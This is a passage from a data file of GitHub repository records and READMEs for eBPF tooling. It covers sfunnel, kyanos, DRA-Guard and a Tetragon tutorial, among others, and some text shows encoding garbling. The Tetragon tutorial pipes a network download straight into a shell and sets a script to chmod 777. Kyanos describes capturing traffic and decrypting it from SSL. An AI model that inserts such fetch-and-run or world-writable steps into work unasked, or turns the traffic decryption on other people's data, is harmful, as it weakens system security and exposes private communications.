2 B        |     21716 |      5.44% | #########
4 B        |     38150 |      9.56% | ################
8 B        |    120776 |     30.27% | ##################################################
16 B       |    103586 |     25.97% | ###########################################
32 B       |     58988 |     14.79% | ########################
64 B       |      7444 |      1.87% | ###
128 B      |     14768 |      3.70% | ######
512 B      |     16638 |      4.17% | #######
Total allocations: 18.4 MiB in 398936 allocations
```

- Minimal overhead

## Limitations

- Only works with statically linked programs(for now). Can work with dynamically
  linked programs, but you should provide the path to the dylib.

## Prerequisites

1. Install bpf-linker: `cargo install bpf-linker`
2. Linux kernel with eBPF support
3. Root privileges (for attaching to processes)

## Usage

Options:

- `--pid <PID>`: Attach to a specific process ID
- `--function <FUNCTION>`: Specify the jemalloc function to trace (default:
  malloc)
- `--order-by <ORDER>`: Order results by 'count' or 'traffic' (default: traffic)
  Traffic is the total allocated size, count is the number of malloc calls.
- `--max-alloc-size <SIZE>`: Maximum allocation size to track
- `--min-alloc-size <SIZE>`: Minimum allocation size to track
- `--sample-every <N>`: Sample every Nth event
- `--skip-size <SIZE>`: Skip allocations with total allocated < SIZE bytes
- `--skip-count <COUNT>`: Skip stack traces with total allocations count < COUNT
- `--csv <PATH>`: Generate CSV output: pid, stack_id, total allocations in
  bytes, count, histogram
  ""stacktrace""
- `--flame <PATH>`: Generate flame graph

Example:

```bash
RUST_LOG=info cargo xtask run --release -- --program ~/dev/oss/coreutils/target/release/coreutils --order-by count --sample-every 100  --skip-count 100 --csv malocs.csv -f malloc --flame malocs.svg
```

This will profile malloc calls in ls program, order results by total allocated
count, generate a CSV output, and create a flame graph.

# How it works

Ebpf program is attached to malloc function in the target program.
For every nth call it tracks stacktrace and size of allocation and store it to
cpu-local hashmap.

Userspace program polls these maps and resolves stacktraces to symbols.
On ctrl+c signal it aggregates all data and prints it.

## Todo

- [x] Aggregate histogram in kernel space. For now, we're just dumping all the
  data to userspace, which gives 1us overhead per call which is unacceptable.
  Pure uprobe uses 20ns per call.
- [ ] Find which malloc is used (now we assume that target is statically linked)
- [ ] Add ratatui based TUI
- [x] Produce flamegraphs
- [x] Add docs and examples
- [ ] somehow proof to ebpf verifier that number [0,1] is valid index for
  function call. For now, it gives amazing errors like:

```
Error: the BPF_PROG_LOAD syscall failed. Verifier output: 0: R1=ctx() R10=fp0
0: (bf) r6 = r1                       ; R1=ctx() R6_w=ctx()
1: (b7) r1 = 4                        ; R1_w=4
2: (63) *(u32 *)(r10 -280) = r1       ; R1_w=4 R10=fp0 fp-280=????4
3: (bf) r2 = r10                      ; R2_w=fp0 R10=fp0
4: (07) r2 += -280                    ; R2_w=fp-280
5: (18) r1 = 0xffff9f84a9a0dc00       ; R1_w=map_ptr(map=CONFIG,ks=4,vs=8)
7: (85) call bpf_map_lookup_elem#1    ; R0_w=map_value_or_null(id=1,map=CONFIG,ks=4,vs=8)
8: (15) if r0 == 0x0 goto pc+152      ; R0_w=map_value(map=CONFIG,ks=4,vs=8)
9: (79) r2 = *(u64 *)(r0 +0)          ; R0=map_value(map=CONFIG,ks=4,vs=8) R2=scalar()
10: (65) if r2 s> 0x2 goto pc+7       ; R2=scalar(smax=2)
11: (b7) r1 = 112                     ; R1_w=112
12: (15) if r2 == 0x0 goto pc+16      ; R2=scalar(smax=2,umin=1)
13: (15) if r2 == 0x1 goto pc+12      ; R2=scalar(smax=2,umin=2)
14: (15) if r2 == 0x2 goto pc+1 16: R0=map_value(map=CONFIG,ks=4,vs=8) R1=112 R2=2 R6=ctx() R10=fp0 fp-280=????mmmm
16: (b7) r1 = 96                      ; R1_w=96
17: (05) goto pc+11
29: (bf) r2 = r6                      ; R2_w=ctx() R6=ctx()
30: (0f) r2 += r1                     ; R1_w=96 R2_w=ctx(off=96)
31: (79) r8 = *(u64 *)(r2 +0)
dereference of modified ctx ptr R2 off=96 disallowed
verification time 73 usec
stack depth 280+0
processed 22 insns (limit 1000000) max_states_per_insn 0 total_states 2 peak_states 2 mark_read 2
```

## License

Apache 2.0 or MIT

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request."
datahangar/sfunnel,6,1,6,10,C,K8s service funneling using eBPF,2024-08-23T15:12:50Z,2025-01-04T14:34:48Z,84,"# sfunnel: multi-port/multi-flow session affinity in Kubernetes

`sfunnel` is an [eBPF](https://ebpf.io/) program designed to [funnel](docs/funneling.md)
multiple traffic flows through a single Kubernetes service _port_, ensuring
[under certain conditions](#requirements) consistent `sessionAffinity: ClientIP`
affinity across all _ports_ within the service.

See the original use-case [here](docs/use-cases/network-telemetry-nfacctd.md).

:warning: `sfunnel` is still in an early development stage.

:no_entry: severe performance degradation when funneling TCP over TCP/UDP is
being investigated (GSO/TSO issues). Do not use it for real traffic.

## At a glance

Example where `TCP/8080` traffic is funneled through `TCP/80`.

Remove _ports_ from the K8s service and e.g. deployment. Add the `sfunnel`
container along with the [rules](docs/rules.md) in `SFUNNEL_RULESET`:

```diff
--- a/service.yaml
+++ b/service.yaml
@@ -1,18 +1,12 @@
 apiVersion: v1
 kind: Service
 metadata:
   name: my-loadbalancer-service
 spec:
   type: LoadBalancer
   selector:
     app: my-nginx-app
   ports:
     - protocol: TCP
       port: 80
       targetPort: 80
-    - protocol: TCP
-      port: 8080
-      targetPort: 8080
   sessionAffinity: ClientIP
```

```diff
--- a/nginx.yaml
+++ b/nginx.yaml
@@ -1,21 +1,31 @@
 apiVersion: apps/v1
 kind: Deployment
 metadata:
   name: my-nginx-deployment
 spec:
   replicas: 4
   selector:
     matchLabels:
       app: my-nginx-app
   template:
     metadata:
       labels:
         app: my-nginx-app
     spec:
       containers:
+        - name: sfunnel-init
+          env:
+            - name: SFUNNEL_RULESET
+              value: ip tcp dport 80 sport 540 actions unfunnel tcp
+          image: ghcr.io/datahangar/sfunnel:0.0.11@sha256:5f130c2bfc95fb0d264ad54c52b1fef26c58e5635f11b8b862efe611b98b1f9a
+          securityContext:
+            privileged: false #Set to true for some public clouds (e.g. GKE standard)
+            capabilities:
+              add: [BPF, NET_ADMIN, SYS_ADMIN]
+          volumeMounts:
+            - name: bpffs
+              mountPath: /sys/fs/bpf
+        - name: sfunnel-init-egress
+          env:
+            - name: SFUNNEL_RULESET
+              value: ip tcp sport 8080 actions funnel tcp dport 540 sport 80
+            - name: DIRECTION
+              value: egress
+          image: ghcr.io/datahangar/sfunnel:0.0.11@sha256:5f130c2bfc95fb0d264ad54c52b1fef26c58e5635f11b8b862efe611b98b1f9a
+          securityContext:
+            privileged: false #Set to true for some public clouds (e.g. GKE standard)
+            capabilities:
+              add: [BPF, NET_ADMIN, SYS_ADMIN]
+          volumeMounts:
+            - name: bpffs
+              mountPath: /sys/fs/bpf
         - name: nginx
           image: nginx:latest
           ports:
             - containerPort: 80
-            - containerPort: 8080
+     volumes:
+       - name: bpffs
+         hostPath:
+           path: /sys/fs/bpf
```
(_funneling HTTPs `TCP/443` through `TCP/80` would work the same way. Manifest
is just too long for this example_)

On the other end (e.g. a Linux host, server etc..), deploy it with the
matching [rules](docs/rules.md):

```shell
IFACES=eth0 LB_IP=1.1.1.1 \
SFUNNEL_RULESET=""ip daddr ${LB_IP} tcp dport 8080 actions funnel tcp dport 80 sport 540"" \
docker run --privileged --network=host -it -e IFACES -e DIRECTION=""egress"" -e SFUNNEL_RULESET ghcr.io/datahangar/sfunnel:0.0.11
```

```shell
IFACES=eth0 LB_IP=1.1.1.1 \
SFUNNEL_RULESET=""ip saddr ${LB_IP} tcp sport 80 dport 540 actions unfunnel tcp"" \
docker run --privileged --network=host -it -e IFACES -e DIRECTION=""ingress"" -e SFUNNEL_RULESET ghcr.io/datahangar/sfunnel:0.0.11
```

The `sfunnel` container will run, load the eBPF code and finish its execution.

## Support

### Service types

* `ClusterIP`: supported
* `LoadBalancer`: supported
* `NodePort`: _untested, but should work_

> :pencil: **Note**
>
> Currently `internalTrafficPolicy: Local` for `ClusterIP` and
> `externalTrafficPolicy: Local` for `NodePort` and `LoadBalancer` services are required.

### Environments

* **Google Kubernetes Engine(GKE)**: Standard cluster.
   - Autopilot clusters are _not supported_ due to lack of eBPF support.
* **MetalLB** with the following CNI plugins:
  * Cilium
  * Flannel
  * Calico
* **Dockerd**

`sfunnel` should work on any environments supporting `sessionAffinity: ClientIP`.
If you encounter any issues or have successfully deployed it in other
environments, please reach out so that we can update this list.

## Requirements

* [eBPF](https://ebpf.io/)-enabled kernel, with support for `clsact` and `direct-action`.
* Proper [MTU configuration](docs/funneling.md#mtu) (20 bytes for TCP, 8 for UDP).
* In Kubernetes:
  * Privileged init container (`CAP_BPF`, `CAP_NET_ADMIN`, `CAP_SYS_ADMIN`)
    * In some cloud providers (E.g. Google Cloud) `privileged=true` is required.
* On the funneling side:
  * Permissions to spawn `sfunnel` (same caps as before).
  * Route or proxy traffic to be funneled. More on this [here](docs/funneling.md)

## More...

* [Use-cases](docs/use-cases/)
* [Funneling?](docs/funneling.md)
* [Rule syntax](docs/rules.md)
* [sfunnel container](docs/container.md)
* [Deploying it in K8s](docs/k8s.md)
* [Next steps](../../issues?q=is%3Aissue+is%3Aopen+label%3Afeature)

Contact
-------

Marc Sune < marcdevel (at) gmail (dot) com>
"
acassen/dra-guard,18,6,18,0,C,Mobile Core-Network routing software,2024-10-16T21:19:30Z,2025-10-06T09:30:48Z,13,"# DRA Guard: Diameter Routing Agent software

<img width=""20%"" src=""https://www.dra-guard.org/assets/logo.png"" align=""left""/>
DRA-Guard is a routing software written in C. The main goal of this project is to provide robust and secure extensions to DRA feature (Diameter Routing Agent). DRA are used in mobile networks to route Diameter traffic between mobile network equipments, like at Roaming interconnections. DRA-Guard implements a set of features to manipulate and analyze Diameter payloads via a Plugin framework and a built-in Route-Optimization feature. DRA-Guard relies on Linux Kernel XDP & Qdisc frameworks using eBPF for low-level features like transparent mode operations. Administration and user-level interface are available via a standard VTY terminal interface.

DRA-Guard is free software; you can redistribute it and/or modify it under the terms of the GNU Affero General Public License Version 3.0 as published by the Free Software Foundation.

# What the hell is this ?
DRA-Guard doesn't aim to replace any DRA product, it rather provides a way to extend its behaviours in order to quickly react or add new features. No product can address all needs, mainly because needs for operators are evolving and new ideas are permanently fast moving.

Long story short : DRA-Guard is a SCTP proxy offering access to Diameter payload. For each Diameter payload a plugin callback is invoked. You can then perform any packet analysis/mangling operations you may want and conclude by an action (PASS or DROP). A way to plug into your Diameter data-path and gain control of it.

DRA-Guard is designed for high perf and built around an asynchronous multi-threaded design. Additionnaly it is supporting a transparent mode to simplify its insertion into an existing architecture without the need to reconfigure anything (this is specially useful when you have long list of peers and you need to go fast without wasting time into so called change request).

DRA-Guard is additionnaly implementing a ""Route Optimization"" framework, a short static example is offered as an example in this OpenSource version, but way more advanced and dynamic routing decisions can be implemented based on multi-metrics.

# Network Architecture
If it can be inserted anywhere in your network, it can be useful at interconnection point where you may want to have option to quickly add perf extensions (monitoring, reporting, mitigation, filtering, ...)
<p align=""center""><img src=""https://www.dra-guard.org/assets/arch-net.png""></p>

# Software Architecture
DRA-Guard is articulated around following components :
<p align=""center""><img src=""https://www.dra-guard.org/assets/arch-soft.png""></p>

# Local Stack Packet re-circulation
DRA-Guard can operate in transparent mode using state-less operations based on a set of eBPF progs loaded at XDP and Qdisc layers. This design provides fast state-less packet re-circulation into Linux Kernel stack to benefit widely used SCTP stack:
<p align=""center""><img src=""https://www.dra-guard.org/assets/local-statck-recirculation.png""></p>

"
isItObservable/Tetragon,0,0,0,0,Shell,,2024-09-25T17:07:31Z,2024-10-22T10:27:08Z,5,"# Is it Observable
<p align=""center""><img src=""/image/logo.png"" width=""40%"" alt=""Is It observable Logo"" /></p>

## Episode : Tetragon
This repository contains the files utilized during the tutorial presented in the dedicated IsItObservable episode related to Tetragon.
<p align=""center""><img src=""/image/tetragon.png"" width=""40%"" alt=""falco Logo"" /></p>

this tutorial will also utilize the OpenTelemetry Operator with:
* the OpenTelemetry Demo
* ungard application
* Tetragon
* Goat application to generate security vioalation

* All the observability data generated by the environment would be sent to Dynatrace.

## Prerequisite
The following tools need to be install on your machine :
- jq
- kubectl
- git
- gcloud ( if you are using GKE)
- Helm


### 1.Create a Google Cloud Platform Project
```shell
PROJECT_ID=""<your-project-id>""
gcloud services enable container.googleapis.com --project ${PROJECT_ID}
gcloud services enable monitoring.googleapis.com \
cloudtrace.googleapis.com \
clouddebugger.googleapis.com \
cloudprofiler.googleapis.com \
--project ${PROJECT_ID}
```
### 2.Create a GKE cluster
```shell
ZONE=europe-west3-a
NAME=isitobservable-tetragon
gcloud container clusters create ${NAME} --zone=${ZONE} --machine-type=e2-standard-4 --num-nodes=2
```


### 3. Clone Github repo

```shell
git clone  https://github.com/isitobservable/tetragon
cd tetragon
```



## Getting started


### Dynatrace Tenant
#### 1. Dynatrace Tenant - start a trial
If you don't have any Dynatrace tenant , then I suggest to create a trial using the following link : [Dynatrace Trial](https://dt-url.net/observable-trial)
Once you have your Tenant save the Dynatrace tenant url in the variable `DT_TENANT_URL` (for example : https://dedededfrf.live.dynatrace.com)
```
DT_TENANT_URL=<YOUR TENANT Host>
```

##### 2. Create the Dynatrace API Tokens
The dynatrace operator will require to have several tokens:
* Token to deploy and configure the various components
* Token to ingest metrics and Traces


###### Operator Token
One for the operator having the following scope:
* Create ActiveGate tokens
* Read entities
* Read Settings
* Write Settings
* Access problem and event feed, metrics and topology
* Read configuration
* Write configuration
* Paas integration - installer downloader
<p align=""center""><img src=""/image/operator_token.png"" width=""40%"" alt=""operator token"" /></p>

Save the value of the token . We will use it later to store in a k8S secret
```shell
API_TOKEN=<YOUR TOKEN VALUE>
```
###### Ingest data token
Create a Dynatrace token with the following scope:
* Ingest metrics (metrics.ingest)
* Ingest logs (logs.ingest)
* Ingest events (events.ingest)
* Ingest OpenTelemetry
* Read metrics
<p align=""center""><img src=""/image/data_ingest_token.png"" width=""40%"" alt=""data token"" /></p>
Save the value of the token . We will use it later to store in a k8S secret

```shell
DATA_INGEST_TOKEN=<YOUR TOKEN VALUE>
```
### Istio

1. Download Istioctl
```shell
curl -L https://istio.io/downloadIstio | sh -
```
This command download the latest version of istio  compatible with our operating system.
2. Add istioctl to you PATH
```shell
cd istio-1.23.1
```
this directory contains samples with addons . We will refer to it later.
```shell
export PATH=$PWD/bin:$PATH
```

### Deploy most of the components 
The application will deploy the entire environment:
```shell
chmod 777 deployment.sh
./deployment.sh  --clustername ""${NAME}"" --dturl ""${DT_TENANT_URL}"" --dtingesttoken ""${DATA_INGEST_TOKEN}"" --dtoperatortoken ""${API_TOKEN}"" 
```

## Tutorial Steps

### Tetragon Notebook

Let's deploy the notebook located : `dynatrace/notebook.json`

In dynatrace , Open The Notebook application and click on upload
<p align=""center""><img src=""/image/notebook.png"" width=""40%"" alt=""tetragon notebook"" /></p>

This notebook is an example on how we could take advantage of log processing with tetragon events.

### Tetragon Dashboard

Let's deploy the dashboard located : `dynatrace/Tetragon.json`

In dynatrace , Open The Dashboard application and click on upload
<p align=""center""><img src=""/image/dashboard.png"" width=""40%"" alt=""Collector dashboard"" /></p>

This dashboard will keep track on the health of tetragon:
- ressource usage
- the various rules
- The tetragon events"
pinoOgni/ebpf-samples,62,8,62,0,C,"This repo contains various examples to learn, explore, and experiment with eBPF.",2024-10-03T11:05:19Z,2025-10-11T17:49:09Z,44,"# ebpf-samples

This repo contains various examples to learn, explore, and experiment with eBPF and not only. I would like to go deeper both in the controlplane and dataplane part. 


### Repository Organization

1. [**headers**](./headers/): Contains various header files used across the programs in this repository.
2. [**vmlinux**](./vmlinux/): Holds the `vmlinux` BTF file, generated with `bpftool` for compatibility with the kernel used in development.
3. [**xdp**](./xdp/README.md): Includes eBPF XDP (eXpress Data Path) program examples. Each example either builds on previous ones or explores similar concepts.
4. [**tracepoint**](./tracepoint/README.md): Features examples related to tracepoints, including syscall and networking-based examples.
5. [**tc**](./tc/README.md): Contains Traffic Control (TC) examples.
6. [**tc-experiments**](./tc-experiments/): This directory includes experimental TC examples that are in an exploratory or developmental phase.
7. [**program_test**](./program_test/README.md): Here there are some eBPF examples that use the `BPF_PROG_TEST_RUN` (in newer kernel versions, `BPF_PROG_RUN`). I didn't know it and once I discovered it I wanted to try it. It's cool!
8. [**program_insights**](./program_insights/): Section dedicated to see how to inspect an eBPF program in order to understand more about eBPF.
9. [**kprobe**](./kprobe/): kprobe examples.

### How to Use It

Use the provided Makefile to build and run examples. For instance:

```sh
make run TARGET=xdp/example1
# or if an argument is needed
make run TARGET=xdp/example1 ARGS=veth1
```

The `make run` command first uses `go generate` to generate files from C code and then builds the binary.

**Note**: I usually use the Makefile only for building the program and then run the binary separately. For example:

```sh
make build TARGET=xdp/example1
sudo ip netns exec ns1 ./xdp/example1/bin/example1 veth1
```

This is much more intuitive and, I think also, faster when using namespaces to test the programs.

For complete documentation, please refer to the relevant **README**.

**Attention**: The `Makefile` may not work for all examples, as **some do not contain Go code**!


### Notes

* This repository primarily uses the [cilium/ebpf](https://github.com/cilium/ebpf) library, with some headers adapted from this library for specific needs. Future examples may incorporate `libbpf`.
* I work on these examples in my free time, after work or on weekends. There may be some mistakes, but thatâ€™s the value of open source: making code accessible and open for everyone to learn from and improve.
* The repository, and especially the documentation, is a work in progress.


### Contributing

* **Feedback and Contributions**: Contributions are welcome! If youâ€™d like to add an example or improve an existing one, please submit a pull request or open an issue.
* **Experimental Code**: The `tc-experiments` folder contains examples in development, so these may change frequently as I refine the code and learn new things.

"
hengyoush/kyanos,4816,216,4816,48,C,"Kyanos is a networking analysis tool using eBPF. It can visualize the time packets spend in the kernel, capture requests/responses, makes troubleshooting more efficient.",2024-04-30T08:36:56Z,2025-10-12T16:21:28Z,596,"# kyanos

<div align=""center""> 
<i>One command to find slowest requests and identify the reasons.</i>
 <br/>
</div>

![](docs/public/kyanos-demo.gif)

<div align=""center"">  
 
[![GitHub last commit](https://img.shields.io/github/last-commit/hengyoush/kyanos)](#) 
[![GitHub release](https://img.shields.io/github/v/release/hengyoush/kyanos)](#) 
[![Test](https://github.com/hengyoush/kyanos/actions/workflows/test.yml/badge.svg)](https://github.com/hengyoush/kyanos/actions/workflows/test.yml) 

<a href=""https://trendshift.io/repositories/12330"" target=""_blank""><img src=""https://trendshift.io/api/badge/repositories/12330"" alt=""hengyoush%2Fkyanos | Trendshift"" style=""width: 250px; height: 55px;"" width=""250"" height=""55""/></a>
[![Featured on Hacker News](https://hackerbadge.now.sh/api?id=42154583)](https://news.ycombinator.com/item?id=42154583)
<a href=""https://hellogithub.com/repository/9e20a14a45dd4cd5aa169acf0e21fc45"" target=""_blank""><img src=""https://abroad.hellogithub.com/v1/widgets/recommend.svg?rid=9e20a14a45dd4cd5aa169acf0e21fc45&claim_uid=temso5CUu6fB7wb"" alt=""Featuredï½œHelloGitHub"" style=""width: 250px; height: 54px;"" width=""250"" height=""54"" /></a>

</div>

[ç®€ä½“ä¸­æ–‡](./README_CN.md) | English

- [English Document](https://kyanos.io/)

## Table of Contents

- [kyanos](#kyanos)
  - [Table of Contents](#table-of-contents)
  - [What is kyanos](#what-is-kyanos)
  - [Examples](#examples)
  - [â— Requirements](#-requirements)
  - [ðŸŽ¯ How to get kyanos](#-how-to-get-kyanos)
  - [ðŸ“ Documentation](#-documentation)
  - [âš™ Usage](#-usage)
  - [ðŸ  How to build](#-how-to-build)
  - [Roadmap](#roadmap)
  - [ðŸ¤ Feedback and Contributions](#-feedback-and-contributions)
  - [ðŸ™‡â€ Special Thanks](#-special-thanks)
  - [ðŸ—¨ï¸ Contacts](#ï¸-contacts)
  - [Star History](#star-history)

## What is kyanos

Kyanos is an **eBPF-based** network issue analysis tool that enables you to
capture network requests, such as HTTP, Redis, and MySQL requests.  
It also helps you analyze abnormal network issues and quickly troubleshooting
without the complex steps of packet capturing, downloading, and analysis.

1. **Powerful Traffic Filtering**: Not only can filter based on traditional
   IP/port information, can also filter by process/container, L7 protocol
   information, request/response byte size, latency, and more.

```bash
# Filter by pid
./kyanos watch --pids 1234
# Filter by container id
./kyanos watch --container-id abc
# Filter by Redis key
./kyanos watch redis --keys my-key1,my-key2
# Filter by response byte size
./kyanos watch --resp-size 10000
```

2. **Advanced Analysis Capabilities** : Unlike tcpdump, which only provides
   fine-grained packet capture, Kyanos supports aggregating captured packet
   metrics across various dimensions, quickly providing the critical data most
   useful for troubleshooting.  
   Imagine if the bandwidth of your HTTP service is suddenly maxed outâ€”how would
   you quickly analyze `which IPs` and `which  requests` are causing it?  
   With Kyanos, you just need one command: `kyanos stat http --bigresp` to find
   the largest response byte sizes sent to remote IPs and view specific data on
   request and response metrics.  
   ![kyanos find big response](docs/public/whatkyanos.gif)

3. **In-Depth Kernel-Level Latency Details**: In real-world, slow queries to
   remote services like Redis can be challenging to diagnose precisely. Kyanos
   provides kernel trace points from the arrival of requests/responses at the
   network card to the kernel socket buffer, displaying these details in a
   visual format. This allows you to identify exactly which stage is causing
   delays.

![kyanos time detail](docs/public/timedetail.jpg)

4. **Lightweight and Dependency-Free**: Almost zero dependenciesâ€”just a single
   binary file and one command, with all results displayed in the command line.

5. **Automatic SSL Traffic Decryption** : All captured requests and responses
   are presented in plaintext.

## Examples

**Capture HTTP Traffic with Latency Details**

Run the command:

```bash
./kyanos watch http
```

The result is as follows:

![kyanos quick start watch http](docs/public/qs-watch-http.gif)

**Capture Redis Traffic with Latency Details**

Run the command:

```bash
./kyanos watch redis
```

The result is as follows:

![kyanos quick start watch redis](docs/public/qs-redis.gif)

**Identify the Slowest Requests in the Last 5 Seconds**

Run the command:

```bash
 ./kyanos stat --slow --time 5
```

The result is as follows:

![kyanos stat slow](docs/public/qs-stat-slow.gif)

## â— Requirements

Kyanos currently supports kernel versions 3.10(from 3.10.0-957) and 4.14 or
above (with plans to support versions between 4.7 and 4.14 in the future).

> You can check your kernel version using `uname -r`.

## ðŸŽ¯ How to get kyanos

You can download a statically linked binary compatible with amd64 and arm64
architectures from the
[release page](https://github.com/hengyoush/kyanos/releases):

```bash
tar xvf kyanos_vx.x.x_linux_amd64.tar.gz
```

Then, run kyanos with **root privilege**:

```bash
sudo ./kyanos watch
```

If the following table appears:
![kyanos quick start success](docs/public/quickstart-success.png) ðŸŽ‰
Congratulations! Kyanos has started successfully.

## ðŸ“ Documentation

[English Document](https://kyanos.io/)

## âš™ Usage

The simplest usage captures all protocols currently supported by Kyanos:

```bash
sudo ./kyanos watch
```

Each request-response record is stored as a row in a table, with each column
capturing basic information about that request. You can use the arrow keys or
`j/k` to move up and down through the records:
![kyanos watch result](docs/public/watch-result.jpg)

Press `Enter` to access the details view:

![kyanos watch result detail](docs/public/watch-result-detail.jpg)

In the details view, the first section shows **Latency Details**. Each block
represents a ""node"" that the data packet passes through, such as the process,
network card, and socket buffer.  
Each block includes a time value indicating the time elapsed from the previous
node to this node, showing the process flow from the process sending the request
to the network card, to the response being copied to the socket buffer, and
finally read by the process, with each stepâ€™s duration displayed.

The second section provides **Detailed Request and Response Content**, split
into Request and Response parts, and truncates content over 1024 bytes.

For targeted traffic capture, such as HTTP traffic:

```bash
./kyanos watch http
```

You can narrow it further to capture traffic for a specific HTTP path:

```bash
./kyanos watch http --path /abc
```

Learn more: [Kyanos Docs](https://kyanos.io/)

## ðŸ  How to build

ðŸ‘‰ [COMPILATION.md](./COMPILATION.md)

## Roadmap

The Kyanos Roadmap shows the future plans for Kyanos. If you have feature
requests or want to prioritize a specific feature, please submit an issue on
GitHub.

_1.6.0_

1. Support for postgresql protocol parsing.
2. Support for HTTP2 protocol parsing.
3. Support for DNS protocol parsing.
4. Support for GnuTLS.

## ðŸ¤ Feedback and Contributions

> [!IMPORTANT]
>
> If you encounter any issues or bugs while using the tool, please feel free to
> ask questions in the issue tracker.

## ðŸ™‡â€ Special Thanks

During the development of kyanos, some code was borrowed from the following
projects:

- [eCapture](https://ecapture.cc/zh/)
- [pixie](https://github.com/pixie-io/pixie)
- [ptcpdump](https://github.com/mozillazg/ptcpdump)

## ðŸ—¨ï¸ Contacts

For more detailed inquiries, you can use the following contact methods:

- **My Email:** [hengyoush1@163.com](mailto:hengyoush1@163.com)
- **My Blog:** [http://blog.deadlock.cloud](http://blog.deadlock.cloud/)

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=hengyoush/kyanos&type=Date)](https://star-history.com/#hengyoush/kyanos&Date)

[Back to top](#top)
"
isala404/scale-to-zero-ebpf,34,3,34,0,Rust,Proof of concept for Implementing a scale to zero architecture with ebpf,2024-01-13T16:23:40Z,2025-06-25T09:56:15Z,6,"# scale-to-zero

## Prerequisites

1. Install bpf-linker: `cargo install bpf-linker`

## Build eBPF

```bash
cargo xtask build-ebpf
```

To perform a release build you can use the `--release` flag.
You may also change the target architecture with the `--target` flag.

## Build Userspace

```bash
cargo build
```

## Run

```bash
RUST_LOG=info cargo xtask run
```

## TODOs

- [ ] Add multi namespace support 
    - currently only default namespace is supported
- [ ] Move the scaling logic to a central operator
    - currently will only work in single node clusters
- [ ] Hold the request till the pod is healthy
    - as of now the requests will fail if the pod takes longer to start
"
dorser/seccomp-ebpf,11,2,11,0,C,,2024-08-27T15:23:22Z,2025-04-16T09:53:16Z,43,"# seccomp-ebpf
## Overview
seccomp-ebpf is an experimental tool designed to convert seccomp profiles (in JSON format) into gadgets (eBPF programs). This project was developed as a practical experiment for the session [""Reinventing seccomp for Fun and Profiles""](https://colocatedeventsna2024.sched.com/event/1izqj/reinventing-seccomp-for-fun-and-profiles-ben-hirschberg-armo-dor-serero-microsoft) at Cilium + eBPF Day NA 2024, exploring the feasibility of using eBPF as a potential replacement for seccomp in managing syscall filtering.

The aim is to bridge the concepts of security and observability by leveraging eBPFâ€™s dynamic capabilities. However, this tool is not intended for production use and should be seen as a proof of concept and a topic for further discussion and exploration.

## Disclaimer
**Experimental Status**: This project is an experimental venture and not intended for use in production environments.
**Compatibility**: The tool was developed and tested on Ubuntu 22.04 with kernel version 6.8 and x86_64 architecture. Other environments have not been tested and may not be supported.
**Limitations**: The current version does not support syscalls that do not have a tracepoint defined, so certain filters may not be created. Only syscalls with downstream LSM hooks can be blocked.

## Background
Seccomp has been a robust method for syscall filtering, but it comes with limitations in flexibility and observability. This project seeks to explore whether eBPF, known for its programmability and dynamic nature, can provide an effective alternative while maintaining security and enhancing observability.

## How To
### Prerequistes
Install Inspektor Gadget's CLI for Linux:
https://github.com/inspektor-gadget/inspektor-gadget?tab=readme-ov-file#linux

### Build
```
make build
```

### Generate seccomp profile gadget
```
Usage:
  seccomp-ebpf generate [flags]

Flags:
  -h, --help             help for generate
  -n, --name string      The name of the generated profile gadget
  -o, --output string    Path to the output directory to save the generated gadget code (default ""gadget/"")
  -p, --profile string   Path to the seccomp profile (required)
```

### Loading the profile
```
# go to the generated gadget directory
make build
make run
```

## Contributions
This is an experimental project with a focus on community learning and discussion. Contributions are welcome to extend its capabilities or refine its current functionality. However, please be aware that this project is in its early stages and subject to change.

## Acknowledgements
Thank you to the Cilium + eBPF Day NA 2024 attendees and community for inspiring this exploration and supporting the ongoing dialogue around modern security practices."
CloudNativeStudyGroup/Free-Credly-Badges,307,57,307,1,,A list of free courses where you can earn Credly digital badges. Feel free to contribute!,2024-10-13T09:11:52Z,2025-10-12T05:05:42Z,50,"# Free courses where you can earn Credly digital badges

A list of free courses where you can earn Credly digital badges. Feel free to contribute!

## The Linux Foundation

![Alt text](images/Linux_Foundation_logo.png?raw=true ""The Linux Foundation Logo"")

The Linux Foundation provides a neutral, trusted hub for developers to code, manage, and scale open technology projects. They offer a number of free courses where you can earn credly badges. 

1. [Introduction to Linux](https://training.linuxfoundation.org/training/introduction-to-linux/) - This prepares you for [LFCS](https://tidd.ly/3FEvqcE) certification. 
2. [Introduction to Kubernetes](https://training.linuxfoundation.org/training/introduction-to-kubernetes/) - This prepares you for [KCNA](https://medium.com/@nvsajeeva/how-to-pass-kcna-kubernetes-and-cloud-native-associate-exam-cb79a2568bc9), [KCSA](https://medium.com/@nvsajeeva/how-to-pass-kcsa-kubernetes-and-cloud-native-security-associate-exam-a7d4b47d72f4), [CKA](https://medium.com/@nvsajeeva/how-to-pass-cka-certified-kubernetes-administrator-exam-beginners-guide-af5803370a3c), [CKAD](https://medium.com/@nvsajeeva/how-to-pass-ckad-certified-kubernetes-application-developer-exam-0bf98998bada) and [CKS](https://medium.com/@nvsajeeva/how-to-pass-cks-certified-kubernetes-security-specialist-exam-56fe04f42094) certifications. Click on the corresponding links for the study guides. 
3. [Introduction to Cloud Infrastructure Technologies](https://training.linuxfoundation.org/training/introduction-to-cloud-infrastructure-technologies/)
4. [Introduction to DevSecOps for Managers](https://training.linuxfoundation.org/training/introduction-to-devsecops-for-managers-lfs180/)
5. [Introduction to GitOps](https://training.linuxfoundation.org/training/introduction-to-gitops-lfs169/) - This prepares you for [GitOps Certified Associate (CGOA)](https://tidd.ly/3DGixye) certification. Click [here](https://medium.com/@nvsajeeva/how-to-pass-cgoa-gitops-certified-associate-exam-63c74676fe3d) for the study guide.
6. [Introduction to Jenkins](https://training.linuxfoundation.org/training/introduction-to-jenkins-lfs167/)
7. [Introduction to DevOps and Site Reliability Engineering](https://training.linuxfoundation.org/training/introduction-to-devops-and-site-reliability-engineering-lfs162/)
8. [Introduction to Serverless on Kubernetes](https://training.linuxfoundation.org/training/introduction-to-serverless-on-kubernetes-lfs157/)
9. [Scaling Cloud Native Applications with KEDA](https://training.linuxfoundation.org/express-learning/scaling-cloud-native-applications-with-keda-lfel1014/)
10. [Introduction to AI/ML Toolkits with Kubeflow](https://training.linuxfoundation.org/training/introduction-to-ai-ml-toolkits-with-kubeflow-lfs147/)
11. [Introduction to Zero Trust](https://training.linuxfoundation.org/training/introduction-to-zero-trust-lfs183/)
